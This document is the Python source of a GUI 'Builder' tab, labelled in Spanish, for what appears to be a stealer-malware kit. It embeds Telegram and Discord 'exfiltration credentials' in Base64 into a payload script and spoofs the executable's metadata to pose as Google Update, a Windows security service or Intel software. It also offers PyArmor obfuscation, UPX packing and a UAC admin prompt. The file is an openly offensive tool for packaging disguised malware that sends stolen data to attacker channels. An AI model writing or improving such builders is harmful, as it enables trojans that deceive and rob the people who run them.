"""
Tab: Builder
────────────
Graphical front-end for build.py — generate a compiled .exe with:
  • Credential embedding (Base64-encoded)
  • Icon picker
  • Metadata spoofing preset selector
  • Obfuscation level toggle (None / PyInstaller / PyArmor)
  • Single "Build" button with live output
"""

import threading
import subprocess
import sys
import base64
import customtkinter as ctk
from pathlib import Path
from tkinter import filedialog

from gui.theme import (
    COLORS, FONTS, PAD,
    make_card, make_label, make_button, make_entry,
    make_section_header, make_badge,
    add_clear_button, add_reveal_button,
    add_folder_button, add_file_button, add_open_button,
    add_refresh_button, add_copy_button,
)


class BuilderView(ctk.CTkScrollableFrame):
    """Graphical builder wrapping build.py with scroll support."""

    PRESETS = {
        "Google":    {
            "company": "Google LLC",
            "desc": "Google Update Setup",
            "product": "Google Update",
            "copyright": "Copyright Google LLC. All rights reserved.",
            "name": "GoogleUpdate"
        },
        "Microsoft": {
            "company": "Microsoft Corporation",
            "desc": "Windows Security Health Service",
            "product": "Windows Operating System",
            "copyright": "© Microsoft Corporation. All rights reserved.",
            "name": "WinSecHealth"
        },
        "Intel":     {
            "company": "Intel Corporation",
            "desc": "Intel(R) Content Protection Framework",
            "product": "Intel(R) Management Engine Components",
            "copyright": "Copyright (c) Intel Corporation.",
            "name": "IntelCPF"
        },
        "Personalizado": None,
    }

    def __init__(self, parent):
        super().__init__(
            parent, 
            fg_color="transparent",
            scrollbar_button_color=COLORS["accent_dim"],
            scrollbar_button_hover_color=COLORS["accent"]
        )
        self._building = False
        self._build_ui()

    # ── UI Construction ───────────────────────────────────────────────────────

    def _build_ui(self):
        # ── Credentials card ─────────────────────────────────────────────────
        make_section_header(self, "Credenciales de Exfiltración", "🔐")
        cred_card = make_card(self)
        cred_card.pack(fill="x", padx=PAD["lg"], pady=(0, PAD["md"]))

        cred_inner = ctk.CTkFrame(cred_card, fg_color="transparent")
        cred_inner.pack(fill="x", padx=PAD["md"], pady=PAD["md"])

        # --- Row: Telegram Token ---
        r1 = ctk.CTkFrame(cred_inner, fg_color="transparent")
        r1.pack(fill="x", pady=(0, PAD["xs"]))
        make_label(r1, "Telegram Token:", style="small", color=COLORS["text_secondary"], width=120, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._cred_tg_token = make_entry(r1, placeholder="123456:ABC-DEF...", show="*", width=340)
        self._cred_tg_token.pack(side="left", padx=(0, PAD["xs"]))
        add_reveal_button(r1, self._cred_tg_token).pack(side="left", padx=(0, PAD["xs"]))
        add_clear_button(r1, self._cred_tg_token).pack(side="left")

        # --- Row: Telegram Chat ID ---
        r2 = ctk.CTkFrame(cred_inner, fg_color="transparent")
        r2.pack(fill="x", pady=(0, PAD["xs"]))
        make_label(r2, "Chat ID:", style="small", color=COLORS["text_secondary"], width=120, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._cred_tg_chat = make_entry(r2, placeholder="-100123...", width=340)
        self._cred_tg_chat.pack(side="left", padx=(0, PAD["xs"]))
        add_clear_button(r2, self._cred_tg_chat).pack(side="left")

        # --- Row: Discord Webhook ---
        r3 = ctk.CTkFrame(cred_inner, fg_color="transparent")
        r3.pack(fill="x", pady=(0, PAD["sm"]))
        make_label(r3, "Discord Webhook:", style="small", color=COLORS["text_secondary"], width=120, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._cred_dc_hook = make_entry(r3, placeholder="https://discord.com/api/webhooks/...", show="*", width=340)
        self._cred_dc_hook.pack(side="left", padx=(0, PAD["xs"]))
        add_reveal_button(r3, self._cred_dc_hook).pack(side="left", padx=(0, PAD["xs"]))
        add_clear_button(r3, self._cred_dc_hook).pack(side="left")

        hint = ctk.CTkFrame(cred_inner, fg_color=COLORS["info_dim"], corner_radius=6)
        hint.pack(fill="x", pady=(PAD["xs"], 0))
        make_label(hint, "  💡 Las credenciales se incrustan en el ejecutable codificadas en Base64 — no quedan en texto plano en el código fuente.", style="small", color=COLORS["info"]).pack(side="left", padx=PAD["sm"], pady=PAD["xs"])

        # ── Metadata / Spoofing card ──────────────────────────────────────────
        make_section_header(self, "Metadatos del Ejecutable (Spoofing)", "🎭")
        meta_card = make_card(self)
        meta_card.pack(fill="x", padx=PAD["lg"], pady=(0, PAD["md"]))

        meta_inner = ctk.CTkFrame(meta_card, fg_color="transparent")
        meta_inner.pack(fill="x", padx=PAD["md"], pady=PAD["md"])

        # Preset row
        rp = ctk.CTkFrame(meta_inner, fg_color="transparent")
        rp.pack(fill="x", pady=(0, PAD["sm"]))
        make_label(rp, "Preset:", style="small", color=COLORS["text_secondary"], width=100, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._preset_var = ctk.StringVar(value="Google")
        ctk.CTkOptionMenu(
            rp,
            values=list(self.PRESETS.keys()),
            variable=self._preset_var,
            command=self._apply_preset,
            fg_color=COLORS["bg_input"],
            button_color=COLORS["accent_dim"],
            button_hover_color=COLORS["accent"],
            dropdown_fg_color=COLORS["bg_card"],
            dropdown_hover_color=COLORS["bg_card_hover"],
            font=FONTS["body"],
            text_color=COLORS["text_primary"],
            width=180,
        ).pack(side="left")

        self._name_var = ctk.StringVar(value="SysHealth")

        grid = ctk.CTkFrame(meta_inner, fg_color="transparent")
        grid.pack(fill="x", pady=(PAD["sm"], 0))

        fields = [
            ("Empresa:",       "company",  "Google LLC"),
            ("Descripción:",   "desc",     "Google Update Setup"),
            ("Producto:",      "product",  "Google Update"),
            ("Copyright:",     "copyright","Copyright Google LLC."),
            ("Nombre EXE:",    "name",     "SysHealth"),
            ("Versión:",       "version",  "1.2.0.0"),
        ]
        self._meta_fields: dict[str, ctk.CTkEntry] = {}
        for i, (label, key, default) in enumerate(fields):
            col = i % 2
            row_frame = ctk.CTkFrame(grid, fg_color="transparent")
            row_frame.grid(row=i // 2, column=col, sticky="w", padx=(0 if col == 0 else PAD["lg"], 0), pady=PAD["xs"])
            make_label(row_frame, label, style="small", color=COLORS["text_secondary"], width=100, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
            entry = make_entry(row_frame, placeholder=default, width=240)
            if key == "name":
                entry.configure(textvariable=self._name_var)
            else:
                entry.insert(0, default)
            entry.pack(side="left", padx=(0, PAD["xs"]))
            add_clear_button(row_frame, entry).pack(side="left")
            self._meta_fields[key] = entry

        # ── Compilation options card ──────────────────────────────────────────
        make_section_header(self, "Opciones de Compilación", "🔨")
        comp_card = make_card(self)
        comp_card.pack(fill="x", padx=PAD["lg"], pady=(0, PAD["md"]))

        comp_inner = ctk.CTkFrame(comp_card, fg_color="transparent")
        comp_inner.pack(fill="x", padx=PAD["md"], pady=PAD["md"])

        # Main layout: Left column for inputs, Right column for checkboxes
        comp_layout = ctk.CTkFrame(comp_inner, fg_color="transparent")
        comp_layout.pack(fill="x")

        l_col = ctk.CTkFrame(comp_layout, fg_color="transparent")
        l_col.pack(side="left", fill="both", expand=True)

        r_col = ctk.CTkFrame(comp_layout, fg_color="transparent")
        r_col.pack(side="right", fill="both", padx=(PAD["lg"], 0))

        # --- LEFT COLUMN (INPUTS) ---
        
        # Row 0: Source File
        r_src = ctk.CTkFrame(l_col, fg_color="transparent")
        r_src.pack(fill="x", pady=(0, PAD["xs"]))
        make_label(r_src, "Origen (.py):", style="small", color=COLORS["text_secondary"], width=100, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._source_var = ctk.StringVar(value="main.py" if Path("main.py").exists() else "")
        src_entry = make_entry(r_src, placeholder="archivo_principal.py", width=240)
        src_entry.configure(textvariable=self._source_var)
        src_entry.pack(side="left", padx=(0, PAD["xs"]))
        add_file_button(
            r_src,
            callback=lambda p: self._source_var.set(p),
            filetypes=[("Archivos Python", "*.py"), ("Todos", "*.*")],
            text="📄"
        ).pack(side="left", padx=(0, PAD["xs"]))
        add_clear_button(r_src, src_entry).pack(side="left")

        # Row 1: Icon
        r_in = ctk.CTkFrame(l_col, fg_color="transparent")
        r_in.pack(fill="x", pady=(0, PAD["xs"]))
        make_label(r_in, "Ícono (.ico):", style="small", color=COLORS["text_secondary"], width=100, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._icon_var = ctk.StringVar(value="app.ico" if Path("app.ico").exists() else "")
        icon_entry = make_entry(r_in, placeholder="ruta/al/icono.ico", width=240)
        icon_entry.configure(textvariable=self._icon_var)
        icon_entry.pack(side="left", padx=(0, PAD["xs"]))
        add_file_button(
            r_in,
            callback=lambda p: self._icon_var.set(p),
            filetypes=[("Archivos de ícono", "*.ico"), ("Todos", "*.*")],
        ).pack(side="left", padx=(0, PAD["xs"]))
        add_clear_button(r_in, icon_entry).pack(side="left")

        # Row 2: Name EXE
        r_name = ctk.CTkFrame(l_col, fg_color="transparent")
        r_name.pack(fill="x", pady=(0, PAD["xs"]))
        make_label(r_name, "Nombre EXE:", style="small", color=COLORS["text_secondary"], width=100, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._name_entry = make_entry(r_name, placeholder="SysHealth", width=240)
        self._name_entry.configure(textvariable=self._name_var)
        self._name_entry.pack(side="left", padx=(0, PAD["xs"]))
        add_clear_button(r_name, self._name_entry).pack(side="left")
        self._meta_fields["name"] = self._name_entry

        # Row 3: Destino
        r_dist = ctk.CTkFrame(l_col, fg_color="transparent")
        r_dist.pack(fill="x")
        make_label(r_dist, "Destino:", style="small", color=COLORS["text_secondary"], width=100, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._dist_var = ctk.StringVar(value="dist")
        dist_entry = make_entry(r_dist, placeholder="dist", width=240)
        dist_entry.configure(textvariable=self._dist_var)
        dist_entry.pack(side="left", padx=(0, PAD["xs"]))
        add_folder_button(
            r_dist,
            callback=lambda p: self._dist_var.set(p),
        ).pack(side="left", padx=(0, PAD["xs"]))
        add_open_button(r_dist, get_path=lambda: self._dist_var.get() or ".").pack(side="left", padx=(0, PAD["xs"]))
        add_clear_button(r_dist, dist_entry).pack(side="left")


        # --- RIGHT COLUMN (CHECKBOXES) ---

        self._obfuscate_var    = ctk.BooleanVar(value=False)
        self._show_console_var = ctk.BooleanVar(value=False)
        self._multifile_var    = ctk.BooleanVar(value=False)
        self._uac_var          = ctk.BooleanVar(value=False)
        self._clean_var        = ctk.BooleanVar(value=True)
        self._upx_var          = ctk.BooleanVar(value=False)

        # Checkbox Grid (in 2 mini-columns inside r_col)
        opts_inner = ctk.CTkFrame(r_col, fg_color="transparent")
        opts_inner.pack(pady=PAD["xs"])

        c1 = ctk.CTkFrame(opts_inner, fg_color="transparent")
        c1.pack(side="left", padx=(0, PAD["md"]))
        c2 = ctk.CTkFrame(opts_inner, fg_color="transparent")
        c2.pack(side="left")

        opts_col1 = [
            ("🛡 Ofuscar con PyArmor",    self._obfuscate_var),
            ("🖥 Mostrar consola",        self._show_console_var),
            ("📂 Multi-archivo",          self._multifile_var),
        ]
        opts_col2 = [
            ("⚡ Limpiar temporales",    self._clean_var),
            ("🔑 Solicitar Admin (UAC)",  self._uac_var),
            ("📦 Compresión UPX",        self._upx_var),
        ]

        for label, var in opts_col1:
            ctk.CTkCheckBox(c1, text=label, variable=var, fg_color=COLORS["accent"], font=FONTS["body"]).pack(anchor="w", pady=PAD["xs"])
        
        for label, var in opts_col2:
            ctk.CTkCheckBox(c2, text=label, variable=var, fg_color=COLORS["accent"], font=FONTS["body"]).pack(anchor="w", pady=PAD["xs"])

        # ── Build button card ─────────────────────────────────────────────────
        btn_container = ctk.CTkFrame(self, fg_color="transparent")
        btn_container.pack(fill="x", padx=PAD["lg"], pady=(PAD["sm"], PAD["md"]))

        self._build_btn = make_button(btn_container, "🔨 INICIAR COMPILACIÓN", command=self._start_build, style="primary", width=280, height=48)
        self._build_btn.configure(font=("Segoe UI", 14, "bold"))
        self._build_btn.pack(pady=PAD["md"]) # Centered by default in a fill="x" frame without side

        # ── Log section with status in header ──────────────────────────────────
        log_header = make_section_header(self, "Salida del Build", "📋")
        
        # Status indicator moved to the right of the header
        self._status_container = ctk.CTkFrame(log_header, fg_color="transparent")
        self._status_container.pack(side="right", padx=(PAD["sm"], 0))
        
        make_label(self._status_container, "ESTADO:", style="tiny", color=COLORS["text_muted"]).pack(side="left", padx=(0, PAD["xs"]))
        self._build_status = make_badge(self._status_container, "ESPERANDO", "text_muted")
        self._build_status.pack(side="left")

        log_card = make_card(self)
        log_card.pack(fill="both", expand=True, padx=PAD["lg"], pady=(0, PAD["lg"]))

        # Log Toolbar
        toolbar = ctk.CTkFrame(log_card, fg_color="transparent")
        toolbar.pack(fill="x", padx=PAD["sm"], pady=(PAD["sm"], 0))

        make_button(toolbar, "🗑 Limpiar log", command=self._clear_logs, style="secondary", width=120).pack(side="left", padx=(0, PAD["xs"]))
        add_copy_button(toolbar, get_text=lambda: self._log.get("0.0", "end"), text="📋 Copiar log", width=120).pack(side="left", padx=(0, PAD["xs"]))
        add_open_button(toolbar, get_path=lambda: self._dist_var.get() or "dist", text="📂 Abrir ubicación", width=140).pack(side="left", padx=(0, PAD["xs"]))
        make_button(toolbar, "🔥 Eliminar builds", command=self._delete_builds, style="danger", width=140).pack(side="left")

        self._log = ctk.CTkTextbox(
            log_card,
            fg_color=COLORS["bg_input"],
            text_color=COLORS["text_primary"],
            font=FONTS["code"],
            corner_radius=8,
            border_width=0,
            height=280, # Fixed height to avoid scroll-ception
            state="disabled",
        )
        self._log.pack(fill="x", padx=PAD["sm"], pady=PAD["sm"])
        self._log._textbox.tag_configure("OK",   foreground=COLORS["success"])
        self._log._textbox.tag_configure("ERR",  foreground=COLORS["danger"])
        self._log._textbox.tag_configure("INFO", foreground=COLORS["text_primary"])
        self._log._textbox.tag_configure("MUTED",foreground=COLORS["text_muted"])

        self._log_line("MUTED", "Configurá las opciones y presioná BUILD para compilar el ejecutable.")
        self._apply_preset("Google")

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _apply_preset(self, name: str):
        preset = self.PRESETS.get(name)
        
        # If Personalized or preset not found, clear everything
        if not preset:
            for key, entry in self._meta_fields.items():
                entry.delete(0, "end")
                if key == "name": self._name_var.set("")
            return

        # Otherwise, apply preset values
        for key, val in preset.items():
            entry = self._meta_fields.get(key)
            if entry:
                entry.delete(0, "end")
                entry.insert(0, val)
                if key == "name": self._name_var.set(val)

    def _pick_icon(self):
        path = filedialog.askopenfilename(
            title="Seleccioná un ícono",
            filetypes=[("Archivos ICO", "*.ico"), ("Todos", "*.*")],
        )
        if path:
            self._icon_var.set(path)

    def _log_line(self, tag: str, msg: str):
        from datetime import datetime
        ts = datetime.now().strftime("%H:%M:%S")
        self._log.configure(state="normal")
        self._log._textbox.insert("end", f"[{ts}] ", "MUTED")
        self._log._textbox.insert("end", msg + "\n", tag)
        self._log._textbox.see("end")
        self._log.configure(state="disabled")

    def _clear_logs(self):
        """Clears the build log textbox."""
        self._log.configure(state="normal")
        self._log.delete("0.0", "end")
        self._log.configure(state="disabled")
        self._log_line("INFO", "Log de compilación limpiado.")

    def _delete_builds(self):
        """Cleans the dist folder."""
        import shutil
        dist = Path(self._dist_var.get() or "dist")
        if dist.exists() and dist.is_dir():
            try:
                shutil.rmtree(dist)
                dist.mkdir(exist_ok=True)
                self._log_line("OK", f"Carpeta {dist}/ limpiada correctamente.")
            except Exception as e:
                self._log_line("ERR", f"Error al limpiar {dist}: {e}")
        else:
            self._log_line("INFO", f"La carpeta {dist}/ no existe o ya está limpia.")

    # ── Build logic ───────────────────────────────────────────────────────────

    def _get_field(self, key: str) -> str:
        entry = self._meta_fields.get(key)
        return entry.get().strip() if entry else ""

    def _embed_credentials(self) -> str:
        """Patch main.py's CONFIG dict with B64-encoded credentials."""
        import ast, re
        src = Path("main.py").read_text(encoding="utf-8")

        tg_token = base64.b64encode(self._cred_tg_token.get().strip().encode()).decode()
        tg_chat  = base64.b64encode(self._cred_tg_chat.get().strip().encode()).decode()
        dc_hook  = base64.b64encode(self._cred_dc_hook.get().strip().encode()).decode()

        patched = re.sub(r'"tg_token":\s*""', f'"tg_token":   "{tg_token}"', src)
        patched = re.sub(r'"tg_chat_id":\s*""', f'"tg_chat_id": "{tg_chat}"', patched)
        patched = re.sub(r'"ds_webhook":\s*""', f'"ds_webhook": "{dc_hook}"', patched)
        return patched

    def _pick_output_dir(self):
        path = filedialog.askdirectory(title="Seleccionar carpeta de destino")
        if path:
            self._dist_var.set(path)

    def _start_build(self):
        if self._building:
            return
        self._building = True
        self._build_btn.configure(state="disabled", text="🔨  COMPILANDO…")
        self._build_status.configure(text="  COMPILANDO…  ", fg_color=COLORS["accent_dim"], text_color=COLORS["accent"])
        threading.Thread(target=self._build_worker, daemon=True).start()

    def _build_worker(self):
        import tempfile, os, shutil
        self._has_errors = False

        self._log_line("INFO", "Preparando build…")

        # 1. Credential Embedding (only for suite's main.py)
        src_file = self._source_var.get() or "main.py"
        is_suite_main = Path(src_file).resolve() == Path("main.py").resolve()
        patched_src = None
        
        if is_suite_main:
            try:
                patched_src = self._embed_credentials()
                self._log_line("INFO", "Credenciales incrustadas en main.py")
            except Exception as e:
                self._log_line("ERR", f"Error al incrustar credenciales: {e}")
        
        # 2. Build command
        cmd = [sys.executable, str(Path("build.py").resolve()), src_file]

        # Metadata
        for flag, key in (
            ("--name",      "name"),
            ("--company",   "company"),
            ("--desc",      "desc"),
            ("--product",   "product"),
            ("--copyright", "copyright"),
            ("--version",   "version"),
        ):
            val = self._get_field(key)
            if val:
                cmd += [flag, val]

        # Preset
        preset_name = self._preset_var.get().lower()
        if preset_name in ("google", "microsoft", "intel"):
            cmd += ["--preset", preset_name]

        # Options
        if not self._obfuscate_var.get():
            cmd.append("--no-obf")
        if self._show_console_var.get():
            cmd.append("--show-console")
        if self._multifile_var.get():
            cmd.append("--multi-file")
        if self._uac_var.get():
            cmd.append("--uac-admin")
        if self._clean_var.get():
            cmd.append("--clean")
        if self._upx_var.get():
            if Path("upx.exe").exists(): cmd += ["--upx", "."]
            elif Path("tools/upx").exists(): cmd += ["--upx", "tools/upx"]

        dist = self._dist_var.get() or "dist"
        cmd += ["--dist-dir", dist]

        icon = self._icon_var.get()
        if icon and Path(icon).exists():
            cmd += ["--icon", icon]

        self._log_line("INFO", f"Comando: {' '.join(cmd)}")

        # Override source with patched version temporarily if needed
        patched_cwd = Path("_main_build_patched.py")
        orig_backup = Path("_main_backup.py")
        try:
            if patched_src:
                patched_cwd.write_text(patched_src, encoding="utf-8")
                shutil.copy2(src_file, orig_backup)
                patched_cwd.replace(src_file)

            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                encoding="utf-8",
                errors="replace",
            )

            for line in proc.stdout:
                line = line.rstrip()
                if not line:
                    continue
                
                # Intelligent error detection
                tag = "INFO"
                if "[+]" in line: tag = "OK"
                elif "[-]" in line or "Error" in line or "failed" in line.lower(): 
                    tag = "ERR"
                    self._has_errors = True
                
                self.after(0, lambda l=line, t=tag: self._log_line(t, l))

            proc.wait()
            success = proc.returncode == 0

        except Exception as e:
            self.after(0, lambda: self._log_line("ERR", f"Error en build: {e}"))
            success = False
        finally:
            # Restore original file if it was patched
            try:
                if orig_backup.exists():
                    orig_backup.replace(src_file)
            except Exception:
                pass
            try:
                patched_cwd.unlink(missing_ok=True)
                tmp_dir and shutil.rmtree(tmp_dir, ignore_errors=True)
            except Exception:
                pass

        if success and not self._has_errors:
            self.after(0, lambda: self._log_line("OK", f"✓ Build exitoso → {dist}/"))
            self.after(0, lambda: self._build_status.configure(
                text="  ✓ EXITOSO  ", fg_color=COLORS["success_dim"], text_color=COLORS["success"]
            ))
        else:
            status_msg = "  ✗ ERROR  " if not success else "  ⚠ CON ADVERTENCIAS  "
            self.after(0, lambda: self._log_line("ERR", "✗ El build no pudo completarse correctamente."))
            self.after(0, lambda: self._build_status.configure(
                text=status_msg, fg_color=COLORS["danger_dim"], text_color=COLORS["danger"]
            ))

        self.after(0, self._finish_build)

    def _finish_build(self):
        self._building = False
        self._build_btn.configure(state="normal", text="🔨  INICIAR COMPILACIÓN")
